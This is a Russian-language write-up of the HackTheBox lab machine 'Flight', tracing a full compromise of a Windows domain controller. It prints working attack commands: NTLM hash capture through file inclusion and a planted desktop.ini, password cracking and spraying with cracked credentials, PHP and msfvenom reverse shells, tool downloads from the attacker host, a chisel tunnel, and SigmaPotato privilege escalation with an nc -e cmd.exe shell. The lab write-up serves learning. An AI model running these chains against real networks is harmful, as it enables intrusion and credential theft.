
[Flight](app.hackthebox.com/machines/Flight?tab=machine_info&sort_by=created_at&sort_type=desc) - это Hard Windows машина с площадки HackTheBox. 

По ходу решения скомпрометируем веб-сервер, получим учетные записи через цепочку атак на NTLM Challenge-Response и прокинем обратную оболочку к целевой системе. После поднимем туннель к внутреннему веб-серверу, получим Meterpreter-сессию, а затем повысим привилегии через SeImpersonatePrivilege.

---
## Reconnaissance

Начнем со сканирования портов

```bash
IP=10.129.228.120
ports=$(nmap -Pn -n --min-rate=1000 $IP -p- | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ','|sed 's/,$//')
sudo nmap -sV -sC $IP -p "$ports" -oN discovery/services
```

![alt](https://github.com/zhabii/htb-writeups/blob/main/media/Flight/Pasted%20image%2020260605221451.png)

Сканер показал несколько открытых портов.  Судя по открытым Kerberos (88 и 464) и LDAP (389, 636) портам мы имеем дело с AD DC. Также работает HTTP сервер на Apache 2.4.53 и SMB.

| Порт       | Сервис                 |
| ---------- | ---------------------- |
| `TCP/53`   | `Simple DNS Plus`      |
| `TCP/80`   | `Apache httpd 2.4.52`  |
| `TCP/88`   | `Kerberos`             |
| `TCP/135`  | `RPC`                  |
| `TCP/139`  | `Netbios-SSN`          |
| `TCP/445`  | `SMB`                  |
| `TCP/464`  | `Kerberos Kpasswd`     |
| `TCP/593`  | `RPC over HTTP`        |
| `TCP/636`  | `LDAP over SSL`        |
| `TCP/3268` | `Global Catalog LDAP`  |
| `TCP/3269` | `Global Catalog LDAPS` |
| `TCP/9389` | `ADWS`                 |

Попробуем достать информацию из SMB шары. 

```bash
crackmapexec smb 10.129.228.120 -u '' -p '' --users
crackmapexec smb 10.129.228.120 -u guest --shares
```

![alt](https://github.com/zhabii/htb-writeups/blob/main/media/Flight/Pasted%20image%2020260605222732.png)

Сейчас доступных директорий нет, однако мы нашли доменное имя `flight.htb`. Добавим его в `/etc/hosts`

```bash
echo "10.129.228.120 flight.htb" | sudo tee -a /etc/hosts
```

На HTTP порте крутится страница заглушка. 

![alt](https://github.com/zhabii/htb-writeups/blob/main/media/Flight/Pasted%20image%2020260605223013.png)

Попробуем найти дополнительные виртуальные хосты с помощью фуззера.

```bash
ffuf -u http://flight.htb -H "Host: FUZZ.flight.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fs 7069
```

![alt](https://github.com/zhabii/htb-writeups/blob/main/media/Flight/Pasted%20image%2020260605223305.png)

ffuf нашел хост `school.flight.htb`. Добавим его в `/etc/hosts` и посмотрим, что на нем работает.
## NTLM Relay

![alt](https://github.com/zhabii/htb-writeups/blob/main/media/Flight/Pasted%20image%2020260605223526.png)

В адресной строке загружаемая страница указана через параметр `view` файла `index.php`. 

```
http://school.flight.htb/index.php?view=about.html
```

Возможно, сервер уязвим к File Inclusion. Пробросим запрос в Burp и попробуем открыть файл `hosts`. У нас получается, что подтверждает наличие уязвимости.

```
/index.php?view=c:/windows/system32/drivers/etc/hosts
```

![alt](https://github.com/zhabii/htb-writeups/blob/main/media/Flight/Pasted%20image%2020260605223838.png)

Попробуем заставить веб-сервер обратиться к подконтрольному ресурсу. В это время Windows постарается авторизоваться и мы сможем перехватить NetNTLMv2-хеш.

Для перехвата используем утилиту Responder.

```bash
sudo responder -I tun0
```

В параметре `view` указываем свой адрес.

```bash
curl "http://school.flight.htb/index.php?view=//10.10.14.123/a/b"
```

В логах Responder видим NetNTMLv2 пользователя `flight\svc_apache`

![alt](https://github.com/zhabii/htb-writeups/blob/main/media/Flight/Pasted%20image%2020260605224112.png)

Запишем полученный хеш в файл и сбрутим его с помощью Hashcat.

```bash
hashcat -m 5600 -a 0 svc_apache_ntlm.txt /usr/share/wordlists/rockyou.txt
```

Через некоторое время получаем первую пару логин-пароль.

![alt](https://github.com/zhabii/htb-writeups/blob/main/media/Flight/Pasted%20image%2020260605224641.png)

```
flight/svc_apache:S@Ss!K@*t13
```

## SMB Enumeration & Lateral Movement

Теперь с доменной учетной записью попробуем получить информацию о директориях и пользователях через SMB.

```bash
crackmapexec smb flight.htb -u svc_apache -p 'S@Ss!K@*t13' --shares
crackmapexec smb flight.htb -u svc_apache -p 'S@Ss!K@*t13' --users
```

![alt](https://github.com/zhabii/htb-writeups/blob/main/media/Flight/Pasted%20image%2020260605225044.png)

У нас нет прав на запись в директории, но мы вытащили много имен пользователей. Попробуем password spraying с найденным ранее паролем `S@Ss!K@*t13`

Записываем логины в файл.

```bash
crackmapexec smb flight.htb -u svc_apache -p 'S@Ss!K@*t13' --users | awk '{print $5}' | tail +4 | head -n -1 > users.txt
```

![alt](https://github.com/zhabii/htb-writeups/blob/main/media/Flight/Pasted%20image%2020260605225358.png)

И используем CrackMapExec для перебора.

```bash
crackmapexec smb flight.htb -u users.txt -p 'S@Ss!K@*t13' --continue-on-success
```

![alt](https://github.com/zhabii/htb-writeups/blob/main/media/Flight/Pasted%20image%2020260605225611.png)

Оказывается пароль подходит к учетной записи `S.Moon`. Проверим наши текущие права на SMB шары.

```bash
crackmapexec smb flight.htb -u S.Moon -p 'S@Ss!K@*t13' --shares
```

![alt](https://github.com/zhabii/htb-writeups/blob/main/media/Flight/Pasted%20image%2020260605225712.png)

Пользователь имеет право на запись в пустую директорию `Shared`. 
Попробуем украсть NetNTLMv2 с помощью файла `desktop.ini`.
Файл `desktop.ini` содержит локальную конфигурацию, применяемую к папке. Внутри него мы можем сослаться на внешний ресурс.
Когда пользователь откроет папку, Windows автоматически спарсит файл и попытается открыть указанный ресурс, отправляя NetNTMLv2-хеш пользователя.

Создаем `desktop.ini` файл со следующим содержимым.

```
[.ShellClassInfo]
IconFile=\\10.10.14.123\a\b
```

И сохраняем его в шаре.

```bash
smbclient -U s.moon --password='S@Ss!K@*t13' '\\flight.htb\Shared'
smb: \> put desktop.ini 
```

Через некоторое время видим новый NetNTMLv2-хеш пользователя `C.Bum` в логах Responder.

![alt](https://github.com/zhabii/htb-writeups/blob/main/media/Flight/Pasted%20image%2020260605230449.png)

Сбрутим хэш так же, как мы это делали ранее.

```bash
hashcat -m 5600 -a 0 c_bum_ntlm.txt /usr/share/wordlists/rockyou.txt
```

![alt](https://github.com/zhabii/htb-writeups/blob/main/media/Flight/Pasted%20image%2020260605230650.png)

Теперь у нас есть еще одна пара логин-пароль.

```
c.bum:Tikkycoll_431012284
```

Проверим права этой учетной записи на SMB шары.

```bash
crackmapexec smb 10.129.228.120 -u c.bum -p 'Tikkycoll_431012284' --shares
```

![alt](https://github.com/zhabii/htb-writeups/blob/main/media/Flight/Pasted%20image%2020260605230922.png)

Теперь у нас есть доступ на запись в директорию `Web`, которая является webroot для сайтов.

![alt](https://github.com/zhabii/htb-writeups/blob/main/media/Flight/Pasted%20image%2020260605231108.png)

## Reverse Shell

Мы уже знаем, что язык бэкенда - PHP. Мы можем создать нагрузку, которая подключается к нашей машине через реверс шелл. 

В качестве нагрузки используем `PHP Ivan Sincek` с сайта [revshell.com](https://www.revshells.com/) Записываем нагрузку в файл `reverse.php` и загружаем его в webroot `school.flight.htb`. 

```bash
smbclient -U c.bum --password='Tikkycoll_431012284' '\\flight.htb\Web'
smb: \> cd school.flight.htb\
smb: \school.flight.htb\> put reverse.php
```

Открываем netcat слушатель.

```bash
rlwrap nc -lvnp 9001
```

И запускаем нагрузку с помощью curl'а.

```bash
curl http://school.flight.htb/reverse.php
```

Ловим бэкконнект от жертвы. 

![alt](https://github.com/zhabii/htb-writeups/blob/main/media/Flight/Pasted%20image%2020260605232122.png)

## Internal Web Server

```cmd
systeminfo
```

![alt](https://github.com/zhabii/htb-writeups/blob/main/media/Flight/Pasted%20image%2020260605232517.png)

Мы работает на Microsoft Windows Server 2019 Standard 10.0.17763 N/A Build 17763 в роли Domain Controller

Посмотрим на сетевые сервисы.

```powershell
netstat -ano -p tcp
```

Видим слушающий 8000 порт, который не был виден при сканировании nmap.

![alt](https://github.com/zhabii/htb-writeups/blob/main/media/Flight/Pasted%20image%2020260605233458.png)

Запрос с помощью `Invoke-WebRequest` показал, что это еще один веб-сервер.

```powershell
powershell iex (Invoke-WebRequest -Uri "http://localhost:8000")
```

![alt](https://github.com/zhabii/htb-writeups/blob/main/media/Flight/Pasted%20image%2020260605234027.png)

В корне видим директорию `inetpub`, которая отвечает за размещение файлов IIS веб-сервера. Внутри `inetpub` есть директория development, к которой имеет доступ пользователь `C.Bum`, пароль которого у нас уже есть. 

![alt](https://github.com/zhabii/htb-writeups/blob/main/media/Flight/Pasted%20image%2020260605234140.png)

Для получения сессии от `C.Bum` воспользуемся утилитой [RunasCs](https://github.com/antonioCoco/RunasCs) (использование обычного `runas.exe` невозможно ввиду не интерактивной сессии).

Размещаем exe на локальном веб-сервере.

```bash
python3 -m http.server
```

И загружаем на жертву. Теперь мы можем открыть еще одну оболочку в контексте `C.Bum`

```powershell
Invoke-WebRequest -Uri "http://10.10.14.123:8000/RunasCs.exe" -Outfile "RunasCs.exe"
./RunasCs.exe C.Bum Tikkycoll_431012284 powershell.exe -r 10.10.14.123:4444
```

![alt](https://github.com/zhabii/htb-writeups/blob/main/media/Flight/Pasted%20image%2020260606002017.png)

Теперь прокинем порты с помощью [chisel](https://github.com/jpillora/chisel/releases/tag/v1.11.5). Запускаем сервер на 8888 порту. 

```bash
./chisel_1.11.5_linux_amd64 server -p 8888 -v --reverse
```

На клиенте пробрасываем локальный 8000 порт на 8002 сервера.

```powershell
.\chisel.exe client 10.10.14.123:8888 R:127.0.0.1:8002:8000
```

![alt](https://github.com/zhabii/htb-writeups/blob/main/media/Flight/Pasted%20image%2020260606013846.png)

Теперь мы можем обратиться к внутреннему веб-серверу через атакующую машину. 

![alt](https://github.com/zhabii/htb-writeups/blob/main/media/Flight/Pasted%20image%2020260606014032.png)

Сгенерируем ASPX реверс шелл с помощью msfvenom.

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=tun0 lport=9003 -f aspx > rev.aspx
```

Полученный пэйлоад запишем в `C:\inetpub\development`

```powershell
Invoke-WebRequest -Uri "http://10.10.14.123:8000/rev.aspx" -Outfile "rev.aspx"
```

![alt](https://github.com/zhabii/htb-writeups/blob/main/media/Flight/Pasted%20image%2020260606014456.png)

Осталось запустить слушатель внутри msfconsole и запустить нагрузку с помощью curl

```bash
curl http://127.0.0.1:8002/rev.aspx
```

Ловим шелл от `iis apppool`

![alt](https://github.com/zhabii/htb-writeups/blob/main/media/Flight/Pasted%20image%2020260606014859.png)

## Privilege Escalation

Просмотрим привилегии с помощью команды `privs`. В выводе видим `SeImpersonatePrivilege`. 

Привилегия позволяет запускать процессы от имени SP, прошедшего авторизацию. Мы можем использовать ее для повышения привилегий до SYSTEM.

![alt](https://github.com/zhabii/htb-writeups/blob/main/media/Flight/Pasted%20image%2020260606014859.png)

Используем эксплоит [SigmaPotato](https://github.com/tylerdotrar/SigmaPotato). Под капотом он создает именованный канал и заставляет процесс с привилегиями SYSTEM обратиться к этому каналу для получения привилегированного токена. Полученный токен используется вместе с `SeImpersonatePrivilege` для создания нового процесса от имени SYSTEM.

В моем случае эксплоит отрабатывал, но не мог создать исходящие сетевые соединения.

![alt](https://github.com/zhabii/htb-writeups/blob/main/media/Flight/Pasted%20image%2020260606022009.png)

Поэтому я загрузил [netcat](https://github.com/int0x33/nc.exe/) на жертву и создал bind shell локально.

```powershell
.\SigmaPotato.exe "C:\Users\Public\nc64.exe -e cmd.exe -l -p 4444"
./nc64.exe 127.0.0.1 4444
```

И так мы получаем шелл от  `authority/system`. Машина пройдена!

![alt](https://github.com/zhabii/htb-writeups/blob/main/media/Flight/Pasted%20image%2020260606022726.png)

---
#web #windows #pentest #writeup 
